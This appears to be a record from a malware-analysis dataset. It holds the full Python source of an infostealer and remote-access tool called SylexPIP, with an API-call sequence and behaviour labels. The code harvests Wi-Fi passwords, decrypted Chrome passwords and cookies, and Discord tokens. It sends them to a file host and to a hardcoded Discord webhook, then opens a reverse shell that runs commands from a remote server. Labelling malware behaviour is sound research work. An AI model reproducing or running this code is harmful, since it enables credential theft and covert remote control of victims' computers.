local_state = json.loads(f.read())\n                key = base64.b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])[5:]\n                self.key = CryptUnprotectData(key, None, None, None, 0)[1]\n\n            def TimeReadable(self, chromedate):\n                if chromedate != 86400000000 and chromedate:\n                    try: return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)\n                    except Exception as error: LOGGER.errors += f\"{error}\\n\"\n                else: return \"\"\n\n            def DecryptData(self, data, key):\n                try:\n                    from Crypto.Cipher import AES\n                    iv = data[3:15]\n                    data = data[15:]\n                    cipher = AES.new(key, AES.MODE_GCM, iv)\n                    return cipher.Decrypt(data)[:-16].decode()\n                except:\n                    try: return str(CryptUnprotectData(data, None, None, None, 0)[1])\n                    except: return \"\"\n\n            def Main(self):\n                db_path = os.path.join(os.environ[\"USERPROFILE\"], \"AppData\", \"Local\", \"Google\", \"Chrome\", \"User Data\", \"Default\", \"Network\", \"Cookies\")\n                filename = \"Cookies.db\"\n                if not os.path.isfile(filename):\n                    shutil.copyfile(db_path, filename)\n                db = sqlite3.connect(filename)\n                db.text_factory = lambda b: b.decode(errors=\"ignore\")\n                cursor = db.cursor()\n                cursor.execute(\"\"\"\n                SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value \n                FROM cookies\"\"\")\n                key = self.key\n                try:\n                    randomfilename = LOGGER.RndFileName()\n                    with open(randomfilename, 'w', encoding=\"latin-1\") as file:\n                        for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():\n                            decrypted_value = self.DecryptData(encrypted_value, key) if not value else value\n                            file.write(f\"\"\"\n                                URL: {host_key}\n                                Cookie name: {name}\n                                Cookie value (encrypted): {encrypted_value}\n                                Cookie value (decrypted): {decrypted_value}\n                                Creation date: {self.TimeReadable(creation_utc)}\n                                Last accessed: {self.TimeReadable(last_access_utc)}\n                                Expires at: {self.TimeReadable(expires_utc)}\n                            \"\"\")\n                            cursor.execute(\"\"\"\n                            UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0\n                            WHERE host_key = ?\n                            AND name = ?\"\"\", (decrypted_value, host_key, name))\n                        file.close()\n                    db.commit()\n                    db.close()\n                    return LOGGER.UploadFile(randomfilename, filename=\"Chrome Cookies\")\n                except Exception as error:\n                    LOGGER.errors += f\"{error}\\n\"\n                    return \"No Chrome Cookie File\"\n\n\n        class DiscordTokens:\n            \"\"\" Scrape local & browser Discord tokens \"\"\"\n            def __init__(self):\n                self.tokens = []\n                self.rawtokens = \"\"\n                self.tokeninfo = \"\"\n\n            def GetTokens(self) -> None:\n                LOCAL = os.getenv(\"LOCALAPPDATA\")\n                ROAMING = os.getenv(\"APPDATA\")\n                PATHS = {\n                    \"Discord\"               : ROAMING + \"\\\\Discord\",\n                    \"Discord Canary\"        : ROAMING + \"\\\\discordcanary\",\n                    \"Discord PTB\"           : ROAMING + \"\\\\discordptb\",\n                    \"Google Chrome\"         : LOCAL + \"\\\\Google\\\\Chrome\\\\User Data\\\\Default\",\n                    \"Opera\"                 : ROAMING + \"\\\\Opera Software\\\\Opera Stable\",\n                    \"Brave\"                 : LOCAL + \"\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default\",\n                    \"Yandex\"                : LOCAL + \"\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default\",\n                    'Lightcord'             : ROAMING + \"\\\\Lightcord\",\n                    'Opera GX'              : ROAMING + \"\\\\Opera Software\\\\Opera GX Stable\",\n                    'Amigo'                 : LOCAL + \"\\\\Amigo\\\\User Data\",\n                    'Torch'                 : LOCAL + \"\\\\Torch\\\\User Data\",\n                    'Kometa'                : LOCAL + \"\\\\Kometa\\\\User Data\",\n                    'Orbitum'               : LOCAL + \"\\\\Orbitum\\\\User Data\",\n                    'CentBrowser'           : LOCAL + \"\\\\CentBrowser\\\\User Data\",\n                    '7Star'                 : LOCAL + \"\\\\7Star\\\\7Star\\\\User Data\",\n                    'Sputnik'               : LOCAL + \"\\\\Sputnik\\\\Sputnik\\\\User Data\",\n                    'Vivaldi'               : LOCAL + \"\\\\Vivaldi\\\\User Data\\\\Default\",\n                    'Chrome SxS'            : LOCAL + \"\\\\Google\\\\Chrome SxS\\\\User Data\",\n                    'Epic Privacy Browser'  : LOCAL + \"\\\\Epic Privacy Browser\\\\User Data\",\n                    'Microsoft Edge'        : LOCAL + \"\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\",\n                    'Uran'                  : LOCAL + \"\\\\uCozMedia\\\\Uran\\\\User Data\\\\Default\",\n                    'Iridium'               : LOCAL + \"\\\\Iridium\\\\User Data\\\\Default\\\\Local Storage\\\\leveld\",\n                    'Firefox'               : ROAMING + \"\\\\Mozilla\\\\Firefox\\\\Profiles\",\n                }\n                \n                for platform, path in PATHS.items():\n                    path = os.path.join(path, \"Local Storage\", \"leveldb\")\n                    if os.path.exists(path):\n                        for file_name in os.listdir(path):\n                            if file_name.endswith(\".log\") or file_name.endswith(\".ldb\") or file_name.endswith(\".sqlite\"):\n                                for line in [x.strip() for x in open(os.path.join(path, file_name), errors=\"ignore\").readlines() if x.strip()]:\n                                    for regex in (r\"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}\", r\"mfa\\.[\\w-]{84}\"):\n                                        for token in re.findall(regex, line):\n                                            if token + \" -> \" + platform not in self.tokens:\n                                                self.tokens.append(token + \" -> \" + platform)\n                                                self.rawtokens += f\"\\n{token}\\n\"\n                return self.tokens\n\n            def Main(self):\n                self.GetTokens()\n                randomfilename = LOGGER.RndFileName()\n                with open(randomfilename, 'w') as file:\n                    for index in range(len(self.tokens)):\n                        self.tokeninfo += f\"[{index+1}] {self.tokens[index]}\\n\"\n                    file.write(str(self.tokeninfo))\n                    file.close()\n\n                return LOGGER.UploadFile(randomfilename, filename=\"Token File\"), self.rawtokens\n\n            def Valid(self, token):\n                \"\"\" Currently not used \"\"\"\n                headers = { 'Authorization': token, 'Content-Type': 'application/json' }\n                r = get('https://discordapp.com/api/v9/users/@me', headers=headers)\n                return True if r.status_code == 200 else False\n\n\n        def Main(self):\n            \"\"\" Get information and construct embed \"\"\"\n            WifiPass   = self.GetWifiPasswords()\n            ChromePass = self.GetChromePasswords()\n            ChromeCks  = self.GetChromeCookies()\n            DiscTokens = self.DiscordTokens()\n            wifi_passwords   = WifiPass.Main()\n            chrome_passwords = ChromePass.Main()\n            chrome_cookies   = ChromeCks.Main()\n            discord_tokens   = DiscTokens.Main()\n\n            system_info = \"\"\n            for key in self.INFO:\n                system_info += f\"{key} : {self.INFO[key]}\\n\"\n\n            embed = {\n                \"color\": 0x000000,\n                        \"fields\": [\n                            {\n                                \"name\": \"**Tokens**\",\n                                \"value\": f\"```{discord_tokens[1]}```\"\n                            },\n                            {\n                                \"name\": \"System Information\",\n                                \"value\": f\"```{system_info}```\"\n                            },\n                            {\n                                \"name\": \"Python Version\",\n                                \"value\": f\"```{pf.python_version()}```\"\n                            },\n                            {\n                                \"name\": \"System Files\",\n                                \"value\": f\"**{discord_tokens[0]}**\\n**{wifi_passwords}**\\n**{chrome_passwords}**\\n**{chrome_cookies}**\\n**{self.ErrorLog()}**\"\n                            }\n                        ],\n                        \"author\": {\n                            \"name\": f\"SylexPIP ✔️\"\n                        },\n                        \"footer\": {\n                            \"text\": f\"github.com/codeuk/sylexpip\"\n                        },\n                    }\n\n            heading = {\n                \"content\": f\"**SylexPIP Executed** ||@everyone||\",\n                \"embeds\": [embed],\n                \"username\": \"SylexPIP\"\n            }\n            req = post(VARIABLES.webhook, headers={\"content-type\": \"application/json\"}, data=json.dumps(heading).encode())\n\n            NETWORK = PROGRAM.NETWORK()\n            NETWORK.Main() if VARIABLES.REVSHELL else NETWORK.Persistence()\n\n\n    class NETWORK:\n        \"\"\" RAT/Reverse Shell (Isn't very good ATM)\"\"\"\n        def __init__(self):\n            self.ip = get(\"https://icanhazip.com\").text.split(\"\\n\")[0]\n            self.cwd = os.getcwd()\n\n        def Persistence(self):\n            return None\n\n        def onLoad(self):\n            embed = {\n                        \"color\": 0x000000,\n                        \"fields\": [\n                            {\n                                \"name\": \"**Reverse Shell Connected**\",\n                                \"value\": f\"```{self.ip} -> {VARIABLES.serverip}:{VARIABLES.port}```\"\n                            },\n                            {\n                                \"name\": \"**Configuration**\",\n                                \"value\": f\"\"\"```PORT -> {VARIABLES.port}\\nIP   -> {self.ip}\\\n                                    \\nBUFFER -> {VARIABLES.buffer}\\nSERVER -> {VARIABLES.serverip}```\"\"\"\n                            }\n                        ],\n                        \"author\": {\"name\": f\"SylexPIP ✔️\"},\n                        \"footer\": {\"text\": f\"github.com/codeuk/sylexpip\"},\n                    }\n            heading = { \"content\": \"\", \"embeds\": [embed], \"username\": \"SylexPIP\" }\n            req = post(VARIABLES.webhook, headers={\"content-type\": \"application/json\"}, data=json.dumps(heading).encode())\n\n        def Main(self):\n            \"\"\" currently working on the localtunnel function and getting the tunnel link automatically... \"\"\"\n            s = sock.socket()\n            s.connect((VARIABLES.serverip, VARIABLES.port))\n            s.send(self.cwd.encode())\n            self.onLoad()\n\n            while True:\n                try:\n                    command = s.recv(VARIABLES.buffer).decode()\n                    split_command = command.split()\n                    if split_command[0] == \"localtunnel\":\n                        try:\n                            tunnel_port = split_command[1]\n                            tunnel_inst = sp.getoutput(\"npm install -g localtunnel\")\n                            tunnel_link = sp.getoutput(f\"lt --port {tunnel_port}\")\n                            http_server = sp.getoutput(f\"python -m http.server --directory C:// {tunnel_port}\")\n                            output = f\"[*] Started localtunnel @ {tunnel_link}\"\n                        except Exception as error:\n                            output = \"[!] Couldn't start localtunnel: \", error\n                    elif command.lower() == \"exit\":\n                        break\n                    else:\n                        output = sp.getoutput(command)\n                    message = f\"{output}\\n\"\n                    s.send(message.encode())\n                except Exception as error:\n                    s.send(\"[!] Error on client side!\".encode())\n            s.close()\n\nPROGRAM = EVIL()\nLOGGER  = PROGRAM.LOGGER()\nLOGGER.Main()\nprint(VARIABLES.endText if VARIABLES.printOnEnd else \"\")",
    "pattern_analysis": {
      "api_sequence": [
        "platform.system",
        "platform.release",
        "platform.version",
        "platform.machine",
        "socket.gethostname",
        "socket.gethostbyname",
        "requests.get",
        "uuid.getnode",
        "re.findall",
        "random.choice",
        "open",
        "requests.post",
        "requests.post.json",
        "os.path.join",
        "os.environ.__getitem__",
        "shutil.copyfile",
        "sqlite3.connect",
        "sqlite3.Connection.execute",
        "EVIL.LOGGER.GetChromePasswords.ChromeDecrypt",
        "EVIL.LOGGER.GetChromePasswords.ChromeDecrypt.DecryptDPAPI",
        "EVIL.LOGGER.GetChromePasswords.ChromeDecrypt.DecryptAES",
        "EVIL.LOGGER.GetChromePasswords.ChromeDecrypt.Decrypt",
        "os.remove",
        "os.path.join",
        "os.environ.__getitem__",
        "open",
        "json.loads",
        "base64.b64decode",
        "EVIL.LOGGER.GetChromePasswords.DecryptDPAPI",
        "os.path.join",
        "os.environ.__getitem__",
        "shutil.copyfile",
        "sqlite3.connect",
        "sqlite3.Connection.cursor",
        "sqlite3.Cursor.execute",
        "EVIL.LOGGER.GetChromeCookies.DecryptData",
        "EVIL.LOGGER.GetChromeCookies.DecryptData.CryptUnprotectData",
        "sqlite3.Cursor.execute",
        "sqlite3.Connection.commit",
        "sqlite3.Connection.close",
        "os.getenv",
        "os.getenv",
        "os.path.join",
        "os.path.exists",
        "os.listdir",
        "open",
        "re.findall",
        "requests.get",
        "requests.post",
        "json.dumps",
        "socket.socket",
        "socket.socket.connect",
        "socket.socket.send",
        "socket.socket.recv",
        "subprocess.getoutput",
        "socket.socket.send",
        "socket.socket.close"
      ],
      "api_sequence_with_args": [
        "platform.system()",
        "platform.release()",
        "platform.version()",
        "platform.machine()",
        "socket.gethostname()",
        "socket.gethostbyname(socket.gethostname())",
        "requests.get('https://icanhazip.com')",
        "uuid.getnode()",
        "re.findall('..', '%012x' % getnode())",
        "random.choice(string.ascii_letters)",
        "open(filepath, 'rb')",
        "requests.post(server, files=file)",
        "requests.post(server, files=file).json()",
        "os.path.join(os.environ['LOCALAPPDATA'], r'Google\\Chrome\\User Data\\Default\\Login Data')",
        "os.environ['LOCALAPPDATA']",
        "shutil.copyfile(_full_path, _temp_path)",
        "sqlite3.connect(db_file)",
        "conn.execute(_sql)",
        "EVIL.LOGGER.GetChromePasswords.ChromeDecrypt(row[2])",
        "EVIL.LOGGER.GetChromePasswords.ChromeDecrypt.DecryptDPAPI(encrypted_txt)",
        "EVIL.LOGGER.GetChromePasswords.ChromeDecrypt.DecryptAES(encrypted_txt)",
        "EVIL.LOGGER.GetChromePasswords.ChromeDecrypt.Decrypt(cipher, encrypted_txt[15:], nonce)",
        "os.remove(db_file)",
        "os.path.join(os.environ['LOCALAPPDATA'], r'Google\\Chrome\\User Data\\Local State')",
        "os.environ['LOCALAPPDATA']",
        "open(os.path.join(os.environ['LOCALAPPDATA'], r'Google\\Chrome\\User Data\\Local State'), encoding='latin-1', mode='r')",
        "json.loads(str(f.readline()))",
        "base64.b64decode(encoded_key.encode())",
        "EVIL.LOGGER.GetChromePasswords.DecryptDPAPI(encrypted_key)",
        "os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Local State')",
        "os.environ['USERPROFILE']",
        "open(local_state_path, 'r', encoding='latin-1')",
        "json.loads(f.read())",
        "base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]",
        "CryptUnprotectData(key, None, None, None, 0)[1]",
        "os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Network', 'Cookies')",
        "os.environ['USERPROFILE']",
        "shutil.copyfile(db_path, filename)",
        "sqlite3.connect(filename)",
        "db.cursor()",
        "cursor.execute('SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value FROM cookies')",
        "EVIL.LOGGER.GetChromeCookies.DecryptData(encrypted_value, key)",
        "CryptUnprotectData(data, None, None, None, 0)[1]",
        "cursor.execute('UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0 WHERE host_key = ? AND name = ?', (decrypted_value, host_key, name))",
        "db.commit()",
        "db.close()",
        "os.getenv('LOCALAPPDATA')",
        "os.getenv('APPDATA')",
        "os.path.join(path, 'Local Storage', 'leveldb')",
        "os.path.exists(path)",
        "os.listdir(path)",
        "open(os.path.join(path, file_name), errors='ignore')",
        "re.findall(regex, line)",
        "requests.get('https://discordapp.com/api/v9/users/@me', headers=headers)",
        "requests.post(VARIABLES.webhook, headers={'content-type': 'application/json'}, data=json.dumps(heading).encode())",
        "json.dumps(heading).encode()",
        "socket.socket()",
        "socket.socket.connect((VARIABLES.serverip, VARIABLES.port))",
        "socket.socket.send(self.cwd.encode())",
        "socket.socket.recv(VARIABLES.buffer).decode()",
        "subprocess.getoutput(command)",
        "socket.socket.send(message.encode())",
        "socket.socket.close()"
      ],
      "mapped_sequence": [
        {
          "api_name": "platform.system",
          "id": "get_os_id",
          "description": "Retrieves operating system identifier",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "os_information"
        },
        {
          "api_name": "platform.release",
          "id": "get_os_release",
          "description": "Retrieves operating system release version",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "os_information"
        },
        {
          "api_name": "platform.version",
          "id": "get_os_version",
          "description": "Retrieves operating system version",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "os_information"
        },
        {
          "api_name": "platform.machine",
          "id": "get_machine_type",
          "description": "Retrieves machine type, e.g., 'x86_64'",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "hardware_information"
        },
        {
          "api_name": "socket.gethostname",
          "id": "get_hostname",
          "description": "Retrieves current host name",
          "first_id": "basic_network_operations",
          "second_id": "network_information_gathering",
          "third_id": "address_information"
        },
        {
          "api_name": "socket.gethostbyname",
          "id": "resolve_hostname",
          "description": "Resolves host name to IPv4 address",
          "first_id": "basic_network_operations",
          "second_id": "network_information_gathering",
          "third_id": "domain_resolution"
        },
        {
          "api_name": "requests.get",
          "id": "send_http_get",
          "description": "Sends HTTP GET request with parameters and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "uuid.getnode",
          "id": "get_hardware_address",
          "description": "Retrieves hardware address as 48-bit integer",
          "first_id": "basic_network_operations",
          "second_id": "network_information_gathering",
          "third_id": "address_information"
        },
        {
          "api_name": "re.findall",
          "id": "compile_regex",
          "description": "Compiles regular expression pattern",
          "first_id": "code_execution",
          "second_id": "code_evaluation_execution",
          "third_id": "code_compilation"
        },
        {
          "api_name": "random.choice",
          "id": "apply_lambda_elements",
          "description": "Applies lambda to elements of two lists",
          "first_id": "data_transformation_processing",
          "second_id": "function_application",
          "third_id": "lambda_application"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "requests.post",
          "id": "send_http_post",
          "description": "Sends HTTP POST request with data and parameters",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "requests.post.json",
          "id": "deserialize_json_response",
          "description": "Deserializes JSON response body to Python object",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "response_processing"
        },
        {
          "api_name": "os.path.join",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "os.environ.__getitem__",
          "id": "get_env_vars",
          "description": "Retrieves environment variables mapping",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "shutil.copyfile",
          "id": "copy_file",
          "description": "Copies file to destination, preserving metadata",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        },
        {
          "api_name": "sqlite3.connect",
          "id": "open_sqlite_db",
          "description": "Opens SQLite database file",
          "first_id": "persistence_stealth",
          "second_id": "data_storage",
          "third_id": "database_operations"
        },
        {
          "api_name": "sqlite3.Connection.execute",
          "id": "execute_sql_query",
          "description": "Executes SQL query on SQLite connection",
          "first_id": "persistence_stealth",
          "second_id": "data_storage",
          "third_id": "database_operations"
        },
        {
          "api_name": "EVIL.LOGGER.GetChromePasswords.ChromeDecrypt",
          "id": "decrypt_chrome_password",
          "description": "Decrypts Chrome password value",
          "first_id": "information_gathering",
          "second_id": "browser_data_theft",
          "third_id": "password_theft"
        },
        {
          "api_name": "EVIL.LOGGER.GetChromePasswords.ChromeDecrypt.DecryptDPAPI",
          "id": "decrypt_dpapi_data",
          "description": "Decrypts Windows DPAPI-encrypted data",
          "first_id": "encryption_hashing",
          "second_id": "encryption_operations",
          "third_id": "decryption_execution"
        },
        {
          "api_name": "EVIL.LOGGER.GetChromePasswords.ChromeDecrypt.DecryptAES",
          "id": "decrypt_chrome_password",
          "description": "Decrypts Chrome password value",
          "first_id": "information_gathering",
          "second_id": "browser_data_theft",
          "third_id": "password_theft"
        },
        {
          "api_name": "EVIL.LOGGER.GetChromePasswords.ChromeDecrypt.Decrypt",
          "id": "decrypt_aes_data",
          "description": "Decrypts data using initialized AES cipher",
          "first_id": "encryption_hashing",
          "second_id": "encryption_operations",
          "third_id": "decryption_execution"
        },
        {
          "api_name": "os.remove",
          "id": "delete_file",
          "description": "Deletes specified file from filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "json.loads",
          "id": "deserialize_from_json",
          "description": "Deserializes JSON string to Python object",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "specific_format_encoding"
        },
        {
          "api_name": "base64.b64decode",
          "id": "decode_base64_to_bytes",
          "description": "Decodes base64-encoded string to bytes",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "base_encoding"
        },
        {
          "api_name": "EVIL.LOGGER.GetChromePasswords.DecryptDPAPI",
          "id": "decrypt_dpapi_data",
          "description": "Decrypts Windows DPAPI-encrypted data",
          "first_id": "encryption_hashing",
          "second_id": "encryption_operations",
          "third_id": "decryption_execution"
        },
        {
          "api_name": "CryptUnprotectData",
          "id": "decrypt_dpapi_data",
          "description": "Decrypts Windows DPAPI-encrypted data",
          "first_id": "encryption_hashing",
          "second_id": "encryption_operations",
          "third_id": "decryption_execution"
        },
        {
          "api_name": "sqlite3.connect",
          "id": "open_sqlite_db",
          "description": "Opens SQLite database file",
          "first_id": "persistence_stealth",
          "second_id": "data_storage",
          "third_id": "database_operations"
        },
        {
          "api_name": "sqlite3.Connection.cursor",
          "id": "create_sql_cursor",
          "description": "Creates cursor object for SQLite connection",
          "first_id": "persistence_stealth",
          "second_id": "data_storage",
          "third_id": "database_operations"
        },
        {
          "api_name": "sqlite3.Cursor.execute",
          "id": "execute_sql_query",
          "description": "Executes SQL query on SQLite connection",
          "first_id": "persistence_stealth",
          "second_id": "data_storage",
          "third_id": "database_operations"
        },
        {
          "api_name": "EVIL.LOGGER.GetChromeCookies.DecryptData",
          "id": "decrypt_chromium_cookies",
          "description": "Decrypts Chromium-based browser cookies for specified domain",
          "first_id": "information_gathering",
          "second_id": "browser_data_theft",
          "third_id": "cookie_theft"
        },
        {
          "api_name": "EVIL.LOGGER.GetChromeCookies.DecryptData.CryptUnprotectData",
          "id": "decrypt_dpapi_data",
          "description": "Decrypts Windows DPAPI-encrypted data",
          "first_id": "encryption_hashing",
          "second_id": "encryption_operations",
          "third_id": "decryption_execution"
        },
        {
          "api_name": "sqlite3.Cursor.execute",
          "id": "execute_sql_query",
          "description": "Executes SQL query on SQLite connection",
          "first_id": "persistence_stealth",
          "second_id": "data_storage",
          "third_id": "database_operations"
        },
        {
          "api_name": "sqlite3.Connection.commit",
          "id": "commit_transaction",
          "description": "Commits current transaction to SQLite database",
          "first_id": "persistence_stealth",
          "second_id": "data_storage",
          "third_id": "database_operations"
        },
        {
          "api_name": "sqlite3.Connection.close",
          "id": "close_sqlite_connection",
          "description": "Closes the SQLite database connection",
          "first_id": "persistence_stealth",
          "second_id": "data_storage",
          "third_id": "database_operations"
        },
        {
          "api_name": "os.getenv",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "os.listdir",
          "id": "list_files_directories",
          "description": "Lists files and directories in specified path",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "re.findall",
          "id": "compile_regex",
          "description": "Compiles regular expression pattern",
          "first_id": "code_execution",
          "second_id": "code_evaluation_execution",
          "third_id": "code_compilation"
        },
        {
          "api_name": "requests.get",
          "id": "send_http_get",
          "description": "Sends HTTP GET request with parameters and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "requests.post",
          "id": "send_http_post",
          "description": "Sends HTTP POST request with data and parameters",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "json.dumps",
          "id": "serialize_to_json",
          "description": "Serializes Python object to JSON string",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "specific_format_encoding"
        },
        {
          "api_name": "socket.socket",
          "id": "create_socket",
          "description": "Creates new socket object",
          "first_id": "basic_network_operations",
          "second_id": "socket_communication",
          "third_id": "socket_creation"
        },
        {
          "api_name": "socket.socket.connect",
          "id": "establish_tcp_connection",
          "description": "Establishes TCP connection to specified address",
          "first_id": "basic_network_operations",
          "second_id": "socket_communication",
          "third_id": "connection_management"
        },
        {
          "api_name": "socket.socket.send",
          "id": "send_socket_data",
          "description": "Sends data over socket connection",
          "first_id": "basic_network_operations",
          "second_id": "socket_communication",
          "third_id": "data_transmission"
        },
        {
          "api_name": "socket.socket.recv",
          "id": "receive_socket_data",
          "description": "Receives data from socket connection",
          "first_id": "basic_network_operations",
          "second_id": "socket_communication",
          "third_id": "data_transmission"
        },
        {
          "api_name": "subprocess.getoutput",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "socket.socket.send",
          "id": "send_socket_data",
          "description": "Sends data over socket connection",
          "first_id": "basic_network_operations",
          "second_id": "socket_communication",
          "third_id": "data_transmission"
        },
        {
          "api_name": "socket.socket.close",
          "id": "close_socket",
          "description": "Closes the socket connection",
          "first_id": "basic_network_operations",
          "second_id": "socket_communication",
          "third_id": "connection_management"
        }
      ],
      "contextual_code": "import re, os, time, shutil, sqlite3, base64, json, sys, string\nimport socket as sock\nimport subprocess as sp\nfrom random import choice\nfrom requests import get, post\nfrom datetime import datetime, timedelta\nfrom uuid import getnode\nfrom win32crypt import CryptUnprotectData\nfrom cryptography.hazmat.backends import default_backend\nfrom cryptography.hazmat.primitives.ciphers import (Cipher, algorithms, modes)\n\nclass VARIABLES:\n    webhook    = \"https://discord.com/api/webhooks/1085607111062454374/bnEvq061GcWHDip-IEF1IJwvOjmVQXhWJMQeFhGK95Edy5QLx1FPkXbDpnB97tebw566\" # your discord webhook\n    printOnEnd = False # True = don't print endText when program finished - False = don't print\n    endText    = \"PROGRAM FINISHED\" # change this to whatever you want to print when the program finishes\n    REVSHELL  = True # False = dont connect to your shell - True = try to connect to your shell\n    serverip  = \"192.168.1.37\" # your server/host ip for victim to connect to \n    buffer    = 1024 # buffer to send (in bytes) each packet\n    port      = 4444 # server port to connect to\n\nclass EVIL:\n    class LOGGER:\n        def __init__(self):\n            self.errors  = \"\"\n            self.INFO    = {'System': pf.system(), 'Release': pf.release(),\n            'Version': pf.version(), 'Arch': pf.machine(),\n            'Host': sock.gethostname(), 'Local IP': sock.gethostbyname(sock.gethostname()),\n            'IP Addr': get(\"https://icanhazip.com\").text.split(\"\\n\")[0], 'MAC Addr': ':'.join(re.findall('..', '%012x' % getnode()))\n            }\n\n        def RndFileName(self):\n            rnd = ''.join(choice(string.ascii_letters) for i in range(6))\n            return f\"C:\\\\ProgramData\\\\{rnd}.txt\"\n\n        def UploadFile(self, filepath, filename=\"File\") -> str:\n            server = 'https://store4.gofile.io/uploadFile'\n            try:\n                file = {'file': open(filepath, \"rb\")}\n                resp = post(server, files=file).json()\n                filelink = f\"[{filename}]({resp['data']['downloadPage']})\"\n            except Exception as error:\n                LOGGER.errors += f\"{error}\\n\"\n                filelink = \"Upload Error\"\n            return filelink\n\n        def ErrorLog(self) -> str:\n            randomfilename = LOGGER.RndFileName()\n            with open(randomfilename, 'w') as file:\n                file.write(str(self.errors))\n                file.close()\n                return self.UploadFile(randomfilename, filename=\"System Error Log\") \\\n                    if self.errors != \"\" else \"No System Error Log\"\n\n        class GetWifiPasswords:\n            def __init__(self):\n                self.command = \"netsh wlan show profile\"\n                self.passwords = \"\"\n            def Passwords(self) -> str:\n                networks = sp.check_output(self.command, shell=True, stderr=sp.DEVNULL, stdin=sp.DEVNULL)\n                networks = networks.decode(encoding=\"latin-1\", errors=\"strict\")\n                network_list = re.findall(\"(?:Profile\\s*:\\s)(.*)\", networks) \n                for network_name in network_list:\n                    try:\n                        command = \"netsh wlan show profile \" + network_name + \" key=clear\"\n                        current_result = sp.check_output(command, shell=True, stderr=sp.DEVNULL, stdin=sp.DEVNULL)\n                        current_result = current_result.decode(encoding=\"latin-1\", errors=\"strict\")        \n                        ssid = re.findall(\"(?:SSID name\\s*:\\s)(.*)\", str(current_result))\n                        authentication = re.findall(r\"(?:Authentication\\s*:\\s)(.*)\", current_result)\n                        cipher = re.findall(\"(?:Cipher\\s*:\\s)(.*)\", current_result)\n                        security_key = re.findall(r\"(?:Security key\\s*:\\s)(.*)\", current_result)\n                        password = re.findall(\"(?:Key Content\\s*:\\s)(.*)\", current_result)\n                        self.passwords += f\"\\n\\nSSID           : {ssid[0]}\"\n                        self.passwords += f\"Authentication : {authentication[0]}\"\n                        self.passwords += f\"Cipher         : {cipher[0]}\"\n                        self.passwords += f\"Security Key   : {security_key[0]}\"\n                        self.passwords += f\"Password       : {password[0]}\"\n                    except Exception as error:\n                        LOGGER.errors += f\"{error}\\n\"\n                return self.passwords\n            def Main(self) -> str:\n                randomfilename = LOGGER.RndFileName()\n                with open(randomfilename, 'w') as file:\n                    file.write(str(self.Passwords()))\n                    file.close()\n                return LOGGER.UploadFile(randomfilename, filename=\"WiFi Passwords\")\n\n        class GetChromePasswords:\n            def __init__(self):\n                self.passwordlog = \"\"\n                self.APP_DATA_PATH   = os.environ['LOCALAPPDATA']\n                self.DB_PATH         = r'Google\\Chrome\\User Data\\Default\\Login Data'\n                self.NONCE_BYTE_SIZE = 12\n            def AddPassword(self, db_file):\n                conn = sqlite3.connect(db_file)\n                _sql = 'select signon_realm,username_value,password_value from logins'\n                for row in conn.execute(_sql):\n                    host = row[0]\n                    if host.startswith('android'):\n                        continue\n                    name = row[1]\n                    value = 